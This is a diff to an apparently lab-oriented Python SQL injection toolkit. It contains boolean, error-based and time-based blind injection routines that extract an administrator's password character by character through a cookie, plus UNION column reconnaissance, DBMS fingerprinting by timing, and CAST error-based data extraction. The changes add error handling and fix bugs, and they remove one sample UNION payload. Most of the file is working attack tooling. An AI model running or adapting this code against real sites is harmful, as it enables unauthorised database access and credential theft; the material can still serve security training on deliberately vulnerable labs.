@@ -1,17 +1,15 @@
-from http.client import responses
 from urllib.parse import quote
 import requests
 import difflib
 from bs4 import BeautifulSoup
 import re
 import string
-from urllib3.util import url
 
-session = requests.Session()
+SESSION = requests.Session()
 CHAR_LIST = string.ascii_letters + string.digits + string.punctuation
-base_url = 'url'
+BASE_URL = 'url'
 
-def post_injection(ses, url, username, password, csrf_field='csrf', success_indicator=None):
+def post_injection(ses, url, username, password, csrf_field='csrf'):
     resp = ses.get(url)
     soup = BeautifulSoup(resp.text, 'html.parser')
     csrf_token = soup.find('input', {'name': csrf_field})
@@ -22,13 +20,13 @@ def post_injection(ses, url, username, password, csrf_field='csrf', success_indi
     if csrf_token:
         payload['csrf_token'] = csrf_token['value']
 
-    response = ses.post(url, data=payload, allow_redirects=True)
+    ses.post(url, data=payload, allow_redirects=True)
 
 def simple_sql_injection(ses, url):
     url_response = ses.get(url)
     text1 = url_response.text.splitlines()
 
-    injection = f"{url}' UNION SELECT BANNER,NULL FROM v$version--"
+    injection = f"{url}' "
     injection_request = ses.get(injection)
     text2= injection_request.text.splitlines()
 
@@ -62,6 +60,8 @@ class BlindInj:
         response = self.ses.get(self.url)
         self.tracking_id = response.cookies.get(self.cookie_name)
         self.session_id = response.cookies.get("session")
+        if self.tracking_id is None:
+            raise ValueError(f"Cookie '{self.cookie_name}' not found. Check cookie_name parameter.")
 
     def _charset_upload(self):
         if self.charset is None:
@@ -69,6 +69,7 @@ class BlindInj:
 
 
     def boolean_injection(self, length_pass, username="administrator", table="users", column="password", success_text="Welcome back!"):
+        self.found_password = ""
         for i in range(1, length_pass + 1):
             for j in self.charset:
                 if self.dbms == "oracle":
@@ -91,13 +92,14 @@ class BlindInj:
                         break
 
                 except requests.exceptions.RequestException as e:
-                    print(e)
+                    print(f"[-] Request error: {e}")
 
             else:
                 print("Can't find a letter")
                 break
 
     def error_injection(self, length_pass, username="administrator", table="users", column="password"):
+        self.found_password = ""
         for i in range(1, length_pass + 1):
             for j in self.charset:
                 if self.dbms == "oracle":
@@ -113,18 +115,21 @@ class BlindInj:
                     self.cookie_name: payload,
                     "session": self.session_id
                 }
+                try:
+                    response = self.ses.get(self.url, cookies=cookies_injection)
 
-                response = self.ses.get(self.url, cookies=cookies_injection)
-
-                if response.status_code == 500:
-                    self.found_password += j
-                    print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
-                    break
+                    if response.status_code == 500:
+                        self.found_password += j
+                        print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
+                        break
+                except requests.exceptions.RequestException as e:
+                    print(f"[-] Request error: {e}")
             else:
                 print("Can't find a letter")
                 break
 
     def delay_injection(self, length_pass, username="administrator", table="users", column="password", delay = 5):
+        self.found_password = ""
         for i in range(1, length_pass + 1):
             for j in self.charset:
                 if self.dbms == "oracle":
@@ -140,14 +145,18 @@ class BlindInj:
                     self.cookie_name: payload,
                     "session": self.session_id
                 }
+                try:
+                    res = self.ses.get(self.url, cookies=cookies_injection, timeout=delay + 5)
+                    elapsed = res.elapsed.total_seconds()
 
-                res = self.ses.get(self.url, cookies=cookies_injection, timeout=delay + 5)
-                elapsed = res.elapsed.total_seconds()
-
-                if (delay + 5) >= elapsed >= delay:
-                    self.found_password += j
-                    print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
-                    break
+                    if (delay + 5) >= elapsed >= delay:
+                        self.found_password += j
+                        print(f"[+] Letter find {i}: {j} | Password: {self.found_password}")
+                        break
+                except requests.exceptions.Timeout:
+                    print(f"[-] Timeout exceeded for char '{j}' at position {i}")
+                except requests.exceptions.RequestException as e:
+                    print(f"[-] Request error: {e}")
             else:
                 print("Can't find a letter")
                 break
@@ -170,7 +179,8 @@ class UnionTableRecon:
         while True:
             res = self.ses.get(injection)
             if column > 10:
-                    return print("Something went wrong")
+                print("Something went wrong")
+                return None
             if res.status_code != 200:
                 injection = injection.replace(sufix, f",NULL{sufix}")
                 column += 1
@@ -182,6 +192,7 @@ class UnionTableRecon:
 
     def recon_column(self, sql_injection):
         matches = list(re.finditer(r'\bNULL\b', sql_injection))
+        string_columns = []
         for ind, m in enumerate(matches):
             start, end = m.span()
             payload = sql_injection[:start] + "'a'" + sql_injection[end:]
@@ -191,6 +202,8 @@ class UnionTableRecon:
                 print(f"Column {ind + 1} - Not an string format")
             else:
                 print(f"Column {ind + 1} - Have string format")
+                string_columns.append(ind + 1)
+        return string_columns
 
 class DbmsVerifyTimeBased:
     def __init__(self, url, ses, delay=5, cookie_name="TrackingId"):
@@ -223,7 +236,7 @@ class DbmsVerifyTimeBased:
         print("[*] Testing URL parameter injection...")
         for db, payload in self._make_payloads("").items():
             test_url = self.url + quote(payload, safe='')
-            if self._test_payload(db, lambda: self.ses.get(test_url, timeout=self.delay+5)):
+            if self._test_payload(db, lambda u=test_url: self.ses.get(u, timeout=self.delay+5)):
                 return db
         return None
 
@@ -255,7 +268,7 @@ class DbmsVerifyTimeBased:
 
         detected_db = self.cookie_sql_verify()
         if detected_db:
-            print(f"[+] Detected DBMS via URL: {detected_db}")
+            print(f"[+] Detected DBMS via Cookie: {detected_db}")
             return detected_db
 
         print("[-] Could not determine DBMS using Time-Based vectors.")
@@ -319,9 +332,17 @@ class CastInj:
     def _init_cookies(self):
         try:
             res = self.ses.get(self.url)
-            return res.cookies.get(self.cookie_name, "")
-        except Exception:
-            return ""
+            self.tracking_id = res.cookies.get(self.cookie_name)
+            self.session_id = res.cookies.get("session")
+            if self.tracking_id is None:
+                raise ValueError(f"Cookie '{self.cookie_name}' not found.")
+        except ValueError:
+            raise
+        except Exception as e:
+            print(f"[-] Failed to init cookies: {e}")
+            self.tracking_id = None
+            self.session_id = None
+
 
     def cast(self):
         payloads = {
@@ -334,7 +355,8 @@ class CastInj:
         payload = payloads.get(self.dbms, payloads["postgresql"])
 
         cookies = {
-            self.cookie_name: payload
+            self.cookie_name: payload,
+            "session": self.session_id
         }
 
         try:
@@ -343,7 +365,7 @@ class CastInj:
                 "postgresql": r'invalid input syntax for (?:type )?integer: "([^"]+)"',
                 "microsoft": r"Converting the \w+ value '([^']+)' to data type int",
                 "mysql": r"XPATH syntax error: '~([^']+)'",
-                "oracle": r'ORA-01722: invalid number.*?"([^"]+)"'  # В зависимости от конфигурации
+                "oracle": r'ORA-01722: invalid number.*?"([^"]+)"'
             }
 
             pattern = regex_patterns.get(self.dbms, regex_patterns["postgresql"])
@@ -365,8 +387,5 @@ class CastInj:
             return None
 
 
-
 if __name__ == "__main__":
-
-    b = BlindInj(ses = session, url = base_url)
-    b.delay_injection(20)
+    show_text(BASE_URL, SESSION)
